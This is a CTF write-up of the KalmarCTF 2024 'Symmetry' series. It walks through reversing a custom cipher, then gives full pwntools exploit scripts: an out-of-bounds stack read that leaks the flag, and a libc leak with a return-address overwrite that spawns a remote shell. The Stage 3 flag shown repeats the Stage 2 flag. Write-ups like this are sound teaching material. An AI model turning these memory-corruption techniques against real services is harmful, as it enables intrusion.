---
title: "KalmarCTF 2024: Symmetry"
excerpt: "One year after they first organized a CTF, kalmarunionen brought us a challenging competition again. I especially enjoyed the series Symmetry."
---

<script lang="ts">
	import Challenge from '$lib/components/Challenge.svelte';

    let downloads1 = ['/blog/2024/01_kalmarctf-24-symmetry/handout1.tar.gz'];
    let downloads2 = ['/blog/2024/01_kalmarctf-24-symmetry/handout2.tar.gz'];
    let downloads3 = ['/blog/2024/01_kalmarctf-24-symmetry/handout3.tar.gz'];

    import stage1_main from "$lib/assets/2024/01_kalmarctf-24-symmetry/main.png";
    import stage1_do_encrypt from "$lib/assets/2024/01_kalmarctf-24-symmetry/do_encrypt.png";
    import stage2_encrypt from "$lib/assets/2024/01_kalmarctf-24-symmetry/encrypt.png";
    import stage2_combine from "$lib/assets/2024/01_kalmarctf-24-symmetry/combine.png";
    import stage2_do_encrypt_highlight from "$lib/assets/2024/01_kalmarctf-24-symmetry/do_encrypt_highlight.png";
    import stage2_set_nibble from "$lib/assets/2024/01_kalmarctf-24-symmetry/set_nibble.png";
    import stage3_shell from "$lib/assets/2024/01_kalmarctf-24-symmetry/shell.png";
</script>

Last weekend, [we](https://kitctf.de/) played KalmarCTF 2024, a great CTF with a lot of difficult and interesting challenges.
I especially liked the Symmetry challenge series, letting you exploit the challenge binary step by step.

## Stage 1: Decryption

<Challenge name="Symmetry 1" category="rev, crypto" solves={42} points={232} flag="kalmar&lbrace;nice!_now_please_try_the_other_two_parts&rbrace;" downloads={downloads1}>

What is better than a crypto, rev, or pwn challenge? A crypto+rev+pwn challenge series. For this first challenge in the series, you get `data.txt`, which was created by encrypting the flag with the binary.

Note: If you are confused by how the data in `data.txt` corresponds to inputs and outputs of the binary, ignore it for now and reverse the binary until you know how to decrypt. If you can do that, the meaning of `data.txt` should be clear as well.
</Challenge>

For the first stage of the series, we get the challenge binary and text file, `data.txt`.
The text file contains the parameters that were passed to the binary and the encrypted output, likely of the first flag, in python-like format.
That binary is a dynamically-liked, stripped C binary in ELF 64-bit format - nothing out of the ordinary here.
Since I am currently trying that out, I loaded the file into Binary Ninja to decompile it and analyze the program logic.
The decompiler of your choice should produce a similar output though, the program is pretty simple.

![main function]({stage1_main})

The main method handles IO for a custom cryptosystem, encrypting given numbers of blocks in an endless loop.
Per block, the program expects an 8-byte key, 16 bytes shift and finally 8 bytes plaintext for the encryption.
Additionally, it allocates 8 bytes per block for the ciphertext.
All these allocated arrays are passed to the encryption function and finally the function prints the result for each block in hex encoding.
While there is nothing special happening here, you may note that we got arrays of 16 values for all parameters and the ciphertext.
That's a bit confusing if you expect the exact same format but we can later make a simple, educated guess as to what we actually got.

![do_encrypt function (func_13b9)]({stage1_do_encrypt})

The parameters are passed through a function that forwards it to the real encryption `func_13b9`.
We will skip that one for now though and look at it later for stage 2.
The encryption is a simple block cipher working in 16 rounds, one for each shift we pass in.
That shift, a fix permutation and an operation I simply called `combine` (`func_1229`) are used to initialize the permutation table (called `combined_shifts` in the screenshot) for the round.
Now, I don't usually play a lot of crypto challenges, so I approached the encryption from a structural standpoint.

The `get_nibble` and `set_nibble` functions get and set nibbles (half-bytes) at a given index of an 8-byte array and work inverse to each other.
We can calculate the permutation for each round and generate an inverse lookup table from that.
If we simply want to implement the encryption logic in reverse, that leaves the `combine` function with parameters `a` and `b` in range `[0..16]`.
Luckily, the mapping is unique for a given output and parameter `b` so we can precalculate that to and reverse it for our decryption.
With this approach, I implemented the decryption, testing it against a python implementation of the encryption.
That way, I could quickly find the small bugs I introduced (like not actually initializing the `COMBINED_LOOKUP` array) to produce the following solve script:

```py
# Used as decrypt.py in other stages
keys = [
    [2, 3, 3, 5, 3, 3, 1, 4, 1, 1, 3, 3, 1, 2, 2, 0],
    [5, 1, 5, 4, 7, 3, 2, 0, 0, 1, 7, 1, 0, 6, 2, 7],
    [2, 6, 6, 0, 5, 6, 5, 1, 6, 4, 7, 1, 1, 7, 3, 1],
    [4, 3, 0, 5, 2, 0, 4, 2, 7, 7, 7, 1, 1, 1, 7, 5],
    [1, 0, 0, 0, 4, 5, 3, 6, 3, 4, 7, 6, 4, 0, 1, 2],
    [5, 5, 7, 1, 3, 1, 7, 6, 6, 3, 1, 1, 2, 4, 6, 7],
    [2, 6, 2, 4, 1, 6, 0, 3, 7, 0, 6, 3, 0, 6, 7, 3],
]
shifts = [
    [0, 1, 3, 5, 0, 1, 1, 0, 0, 1, 3, 5, 0, 1, 1, 0],
    [0, 1, 3, 5, 0, 1, 1, 0, 0, 1, 3, 5, 0, 1, 1, 0],
    [0, 1, 3, 5, 0, 1, 1, 0, 0, 1, 3, 5, 0, 1, 1, 0],
    [0, 1, 3, 5, 0, 1, 1, 0, 0, 1, 3, 5, 0, 1, 1, 0],
    [0, 1, 3, 5, 0, 1, 1, 0, 0, 1, 3, 5, 0, 1, 1, 0],
    [0, 1, 3, 5, 0, 1, 1, 0, 0, 1, 3, 5, 0, 1, 1, 0],
    [0, 1, 3, 5, 0, 1, 1, 0, 0, 1, 3, 5, 0, 1, 1, 0],
]
ciphertexts = [
    [8, 12, 10, 7, 2, 6, 3, 2, 14, 1, 8, 4, 2, 12, 9, 15],
    [10, 13, 5, 2, 13, 12, 11, 5, 14, 5, 3, 12, 4, 11, 0, 9],
    [10, 4, 0, 3, 9, 13, 13, 2, 2, 1, 0, 4, 3, 15, 11, 12],
    [7, 13, 1, 13, 9, 9, 9, 10, 9, 12, 3, 0, 1, 10, 7, 12],
    [13, 3, 10, 6, 9, 9, 2, 13, 1, 10, 13, 0, 4, 2, 1, 0],
    [6, 2, 2, 2, 15, 9, 12, 4, 7, 6, 2, 15, 1, 10, 14, 7],
    [10, 12, 6, 14, 14, 2, 14, 12, 15, 0, 15, 0, 8, 9, 4, 2],
]


PERMUTATION = bytes.fromhex("090a08010e03070f0b0c02000405060d")


def to_nibbles(data: bytes) -> list[int]:
    return [v for pos in range(len(data)) for v in [data[pos] >> 4, data[pos] & 0xF]]


def from_nibbles(nibbles: list[int]) -> bytes:
    return bytes(
        [
            (nibbles[2 * pos] << 4 | nibbles[2 * pos + 1])
            for pos in range(len(nibbles) // 2)
        ]
    )


def combine(shift: int, other: int):
    other_bit = other & 1
    shift_up = shift >> 1
    other_up = other >> 1

    if (shift & 1) != 1:
        out = other_bit + ((other_up + shift_up) * 2)
    else:
        diff = (((shift_up - other_up) * 2) & 0xE) - other_bit
        out = diff + 1

    return out


combine_matching = {}
for s in range(2**4):
    for o in range(2**4):
        com = combine(s, o) & 0xF

        if (o, com) in combine_matching:
            print("Cannot happen!")
            exit(1)
        else:
            combine_matching[(o, com)] = s


def reverse_combine(other: int, out: int) -> int:
    return combine_matching[(other, out)]


def set_nibble(buffer: list[int], idx: int, val: int):
    buffer[idx] = val
    return buffer


def get_nibble(buffer: list[int], idx: int) -> int:
    # list of 16 nibbles, higher order values first
    return buffer[idx]


def encrypt_block(
    key_nibbles: list[int], shifts: list[int], plain_nibbles: list[int]
) -> list[int]:
    out_nibbles = plain_nibbles.copy()
    for s in shifts:
        COMBINED = [0] * 16
        for i in range(16):
            COMBINED[PERMUTATION[i]] = combine(s, i)

        tmp = [0] * 16

        for k in range(16):
            plain_nibble = get_nibble(out_nibbles, k)
            set_nibble(tmp, COMBINED[k], plain_nibble)

        for k1 in range(16):
            key_nibble = get_nibble(key_nibbles, k1)
            tmp_nibble = get_nibble(tmp, k1)
            com = combine(tmp_nibble, key_nibble) & 0xF
            set_nibble(tmp, k1, com)
            pass

        for k2 in range(16):
            set_nibble(out_nibbles, k2, COMBINED[COMBINED[get_nibble(tmp, k2)]])

    return out_nibbles


def decrypt_block(key_nibbles: list[int], shifts: list[int], cipher_nibbles: list[int]):
    out_nibbles = cipher_nibbles.copy()

    for s in reversed(shifts):
        COMBINED = [0] * 16
        for i in range(16):
            COMBINED[PERMUTATION[i]] = combine(s, i)
        COMBINED_LOOKUP = [0] * 16
        for i in range(16):
            COMBINED_LOOKUP[COMBINED[i]] = i

        tmp = [0] * 16
        for k2 in reversed(range(16)):
            val = get_nibble(out_nibbles, k2)
            set_nibble(tmp, k2, COMBINED_LOOKUP[COMBINED_LOOKUP[val]])

        for k1 in reversed(range(16)):
            key_nibble = get_nibble(key_nibbles, k1)
            val = get_nibble(tmp, k1)
            uncom = reverse_combine(key_nibble, val)
            set_nibble(tmp, k1, uncom)

        for k in reversed(range(16)):
            val = get_nibble(tmp, COMBINED[k])
            set_nibble(out_nibbles, k, val)

    return out_nibbles


flag = b""
for block in range(len(keys)):
    block_nibbles = decrypt_block(keys[block], shifts[block], ciphertexts[block])
    block_bytes = bytes(
        [
            ((block_nibbles[2 * pos] << 4) | block_nibbles[2 * pos + 1])
            for pos in range(len(block_nibbles) // 2)
        ]
    )
    flag += block_bytes

print(flag)
```

After the competition, it was pretty interesting for me to see the perspective of crypto players on this challenge.
For example, they saw a simple Permutation-Substitution-Network and identified `func_1229` that I naively called `combine` as multiplication in D8 (the dihedral group, I think).
This mix of perspectives makes the challenge really cool, in my opinion. 

## Stage 2: Reading

<Challenge name="Symmetry 2" category="crypto, rev, pwn" solves={19} points={449} flag="kalmar&lbrace;u_c4n_r34d!n0w_d0_wR1t1n&rbrace;" downloads={downloads2}>
What is better than a crypto, rev, or pwn challenge? A crypto+rev+pwn challenge series. For this second challenge in the series, the flag is contained in the binary on the remote. The binary in the handout is identical with the exception of the bytes that make up the flag, which have been replaced to create a fake flag for testing.

`nc chal-kalmarc.tf 8` 
</Challenge>

For the second challenge, I worked together with Ordoviz.
Together, we started to look at the fake flag mentioned in the description and tried to find a way to leak that on the remote.
This flag is used in `func_15d7` below that we skipped earlier.
`__builtin_strncpy` is Binary Ninja's way of saying that the constant is copied to the stack.
Thus, we need to find a way to read the stack on the remote instance.

![encrypt function (func_15d7)]({stage2_encrypt})

Now, most good old binary exploitation starts with a crash.
We got one here by testing random input (in other words, spamming text): `[1]    185560 segmentation fault (core dumped)  ./challenge`.
Ordoviz looked at the core dump and then used `rr` to step through a recording of a crashing sample input we used to find
that it had overwritten the return address of `set_nibble` (`func_1320`).
We had produced an index that was larger than the expected range of `[0..16]` in the call at address `0x14ad`.
Looking at that address, I remembered that the `combine` function (`func_1229`) was unbounded for the addition case:

![combine function (func_1229)]({stage2_combine})

That let us write out of bounds in that call when using shift values larger than fifteen.
Provided we account for the permutation, we can write 8 bytes with that OOB write gadget.
I quickly tested that and build an exploit script for that.
Meanwhile, Ordoviz looked at the libc we got in the second handout and analyzed possible exploitation paths and useful gadgets.
Now, we were mainly interested in reading not writing but revisiting the encryption function shows an opportunity for that as well.

![do_encrypt function (func_13b9) with highlight on second array access]({stage2_do_encrypt_highlight})

When writing to the encryption buffer at the end of the round the program uses a nested array access on the permutation array.
Knowing that we can fill that with too large values, the outer access will read out of bounds from that base address.

The easiest setup I found for that was producing 1-byte-read gadget.
Because we write OOB at address `0x14ad` the temporary buffer is not initialized as intended.
On the remote it likely contained an address, according to our tests on different setups.
That leaves two clean null bytes though that we can use.
In the second inner loop the key nibbles will be copied, leaving those two bytes as zero when we send a key like `'0'*16`.
Then, in the third loop that value (as nibbles) is used as the first index accessing the permutation array.
We can set that to the offset we like to read directly using the shifts.
Now, I didn't consider this correctly and so I used the write gadget to overwrite the first bytes of the permutation buffer first.
A bit of unnecessary work, but hey, it's also a working solution.
The outer access than reads our target byte and it runs through the remaining 15 rounds of the encryption.
We can than decrypt that (my function from Stage 1 can do that by just passing less shifts) to nearly reconstruct the flag.

```py
# WARNING: solution unstable for general use (see improved script in stage 3)!
from dataclasses import dataclass
import pwn

from decrypt import PERMUTATION, decrypt_block, from_nibbles, to_nibbles


@dataclass
class Block:
    # key: bytes
    shifts: list[int]
    plaintext: bytes


PERMUTATION_LOOKUP = [0] * 16
for i in range(16):
    PERMUTATION_LOOKUP[PERMUTATION[i]] = i


PATH = "./challenge_patched"
RETURN_OFFSET = 0x58


binary = pwn.ELF(PATH)


# Currently 8 bytes only, max offset 127
def build_payload(payload: bytes, offset: int):
    assert len(payload) == 8
    assert offset <= 127

    shifts = [0] * 16
    shifts[0] = offset * 2

    out = [0] * 16
    payload_nibbles = to_nibbles(payload)
    for i in range(16):
        out[i] = payload_nibbles[PERMUTATION_LOOKUP[i]]

    real_payload = from_nibbles(out)

    return Block(shifts, real_payload)


def send_block(conn: pwn.tube, block: Block):
    conn.recvuntil(b"Please provide a key for block ")
    conn.recvuntil(b": ")
    conn.sendline(b"0011223344550011")
    for pos in range(16):
        conn.recvuntil(b": ")
        conn.sendline(hex(block.shifts[pos])[2:].encode())
    conn.recvuntil(b"Please provide plaintext for block")
    conn.recvuntil(b": ")
    conn.sendline(block.plaintext.hex().encode())


def unscramble(upper, lower):
    if upper > lower:
        return (upper - lower) << 4 | lower & 0xF
    else:
        return (0x10 + upper - lower) << 4 | lower & 0xF


def reconstruct_data(read_data: bytes):
    shifts = [0] * 15
    dec = decrypt_block(
        to_nibbles(bytes.fromhex("0011223344550011")), shifts, to_nibbles(read_data)
    )
    dec = dec[-4:]
    fixed_data = bytes([unscramble(dec[2 * pos], dec[2 * pos + 1]) for pos in range(len(dec) // 2)])
    
    return fixed_data


def create_conn():
    if pwn.args.GDB:
        conn = pwn.gdb.debug(PATH, aslr=False)
    elif pwn.args.REMOTE:
        conn = pwn.remote("chal-kalmarc.tf", 8)
    else:
        conn = pwn.process(PATH)
    return conn


def main():
    with create_conn() as conn:
        OFFSET = 0x80
        flag = ""
        for i in range(64):
            conn.recvuntil(b"Number of blocks: ")
            conn.sendline(b"1")

            block = build_payload((OFFSET+i).to_bytes(1)*8, RETURN_OFFSET - 0x48)
            send_block(conn, block)

            conn.recvuntil(b"Block 0: ")
            read_leak = conn.recvline()[:-1].decode()
            print("leak:", read_leak)
            next_char = reconstruct_data(bytes.fromhex(read_leak)).decode()[0]
            flag += next_char

            if next_char == '}':
                break

        print(flag)
        conn.interactive()
    pass


if __name__ == "__main__":
    main()

```

![set_nibble function (func_1320)]({stage2_set_nibble})

There's one more step we need to do which I called unscramble here.
Because `set_nibble` (`func_1320`) expects us to pass in nibbles, not full bytes as we did, it first sets the upper nibble of the buffer to the lower nibble of the value (the `else` case with even index).
Then it adds the whole value byte to that in the first case.
Thus, we need to subtract the added lower nibble (which we know for sure) from the upper one we get and account for overflows:

```
Value '{' (0x7b):
We get: (0xb0 + 0x7b) = 0x12b => 0x2b
Reconstruct: (2 <= 0xb) => 0x100 + 0x2b - 0xb0 = 0x7b

Value 'a' (0x61):
We get: (0x10 + 0x61) = 0x71
Reconstruct: (7 > 1) => 0x71 - 0x10 = 0x61
```

Like that, we can read data at a certain stack offset and use that to leak the flag.

## Stage 3: Writing

<Challenge name="Symmetry 3" category="pwn, crypto, rev" solves={13} points={477} flag="kalmar&lbrace;u_c4n_r34d!n0w_d0_wR1t1n&rbrace;" downloads={downloads3}>
What is better than a crypto, rev, or pwn challenge? A crypto+rev+pwn challenge series. For this last challenge in the series, the flag is contained in a file on the remote. Note: The remote is the same as for Symmetry 2.

`nc chal-kalmarc.tf 8` 
</Challenge>

Now, funny enough I already built a write gadget for the second challenge.
For this one, I simply cleaned up the code a lot and fixed a few bugs where I accidentally overwrote stuff (because I didn't send null bytes in plaintext bytes I didn't specifically need).
For testing, we used a Dockerfile of another challenge that Ordoviz hijacked for this challenge and I inserted some debugging:

```Dockerfile
FROM ubuntu:22.04@sha256:f9d633ff6640178c2d0525017174a688e2c1aef28f0a0130b26bd5554491f0da

RUN apt update && apt install -y socat
RUN apt-get -y install gdbserver

RUN mkdir /app
RUN useradd ctf

COPY challenge /app/challenge

USER ctf

EXPOSE 1337

# CMD socat tcp-l:1337,reuseaddr,fork exec:/app/challenge,pty,echo=0,raw,iexten=0
CMD [ "socat", "tcp-l:1337,reuseaddr,fork", "EXEC:'gdbserver 0.0.0.0:1234 /app/challenge',pty,echo=0,raw,iexten=0" ]
```

The provided binary had some magic gadgets we found with `one_gadget`.
When using a key of `'a'*16` we found a stable setup with the required registers pointing to the zero buffer on the stack after the flag.
With that, we spawned a shell on the remote and got the final flag:

![shell on remote with cat flag]({stage3_shell})

```py
from dataclasses import dataclass
import pwn

from decrypt import PERMUTATION, decrypt_block, from_nibbles, to_nibbles


@dataclass
class Block:
    key: str  # hex string
    shifts: list[int]
    plaintext: bytes


PERMUTATION_LOOKUP = [0] * 16
for i in range(16):
    PERMUTATION_LOOKUP[PERMUTATION[i]] = i


PATH = "./challenge_patched"
RETURN_OFFSET = 0x58
SHIFTS_OFFSET = 0x10
LIBC_LEAK = 0x28 - SHIFTS_OFFSET
LEAK_OFFSET = 0x62142


binary = pwn.ELF(PATH)


# Currently 8 bytes only, max offset 127
def build_payload(payload: bytes, offset: int):
    assert len(payload) == 8
    assert offset <= 127

    shifts = [0] * 16
    shifts[0] = offset * 2

    out = [0] * 16
    payload_nibbles = to_nibbles(payload)
    for i in range(16):
        out[i] = payload_nibbles[PERMUTATION_LOOKUP[i]]

    real_payload = from_nibbles(out)

    return Block("a" * 16, shifts, real_payload)


def send_block(conn: pwn.tube, block: Block):
    conn.recvuntil(b"Please provide a key for block ")
    conn.recvuntil(b": ")
    conn.sendline(block.key.encode())
    for pos in range(16):
        conn.recvuntil(b": ")
        conn.sendline(hex(block.shifts[pos])[2:].encode())
    conn.recvuntil(b"Please provide plaintext for block")
    conn.recvuntil(b": ")
    conn.sendline(block.plaintext.hex().encode())


def unscramble(upper, lower):
    if upper >= lower:
        return (upper - lower) << 4 | lower & 0xF
    else:
        return (0x10 + upper - lower) << 4 | lower & 0xF


def reconstruct_data(read_data: bytes, key: str):
    shifts = [0] * 15
    dec = decrypt_block(to_nibbles(bytes.fromhex(key)), shifts, to_nibbles(read_data))

    fixed_data = bytes(
        [unscramble(dec[-2], dec[-1])]
    )

    return fixed_data


def read_byte(conn: pwn.tube, offset: int):
    conn.recvuntil(b"Number of blocks: ")
    conn.sendline(b"1")

    block = build_payload((offset).to_bytes(1) + b"\x00"*7, SHIFTS_OFFSET)
    block.key = "0"*16
    send_block(conn, block)

    conn.recvuntil(b"Block 0: ")
    read_leak = conn.recvline()[:-1].decode()
    # print("leak:", read_leak)
    return reconstruct_data(bytes.fromhex(read_leak), block.key)[0]


def read_bytes(conn: pwn.tube, offsets: list[int]):
    data = []
    for off in offsets:
        data.append(read_byte(conn, off))

    return bytes(data)[::-1]


def create_conn():
    if pwn.args.GDB:
        conn = pwn.gdb.debug(PATH, aslr=True)
    elif pwn.args.REMOTE:
        conn = pwn.remote("chal-kalmarc.tf", 8)
    elif pwn.args.DOCKER:
        conn = pwn.remote("localhost", 1337)
    else:
        conn = pwn.process(PATH)
    return conn


def main():
    with create_conn() as conn:
        OFFSET = 0x80

        print(read_byte(conn, LIBC_LEAK+1))
        leak = read_bytes(conn, [(LIBC_LEAK + o) for o in range(8)])
        print(leak.hex())
        libc_base = int.from_bytes(leak, 'big') - LEAK_OFFSET
        print(hex(libc_base))

        input()

        conn.recvuntil(b"Number of blocks: ")
        conn.sendline(b"1")
        block = build_payload((libc_base+0xebc85).to_bytes(8, 'little'), RETURN_OFFSET)
        block.key = "a" * 16
        send_block(conn, block)

        conn.interactive()
    pass


if __name__ == "__main__":
    main()

```

## Final words

The challenge provided a lot of opportunities I didn't use.
For example, you could of course send more than one block at a time to easily expand both read and write.
Then, you could read all at once, set up ROP easily and so on.
That's what I like about this challenge: It provides a lot of room for creative solutions.
Try out your own ideas!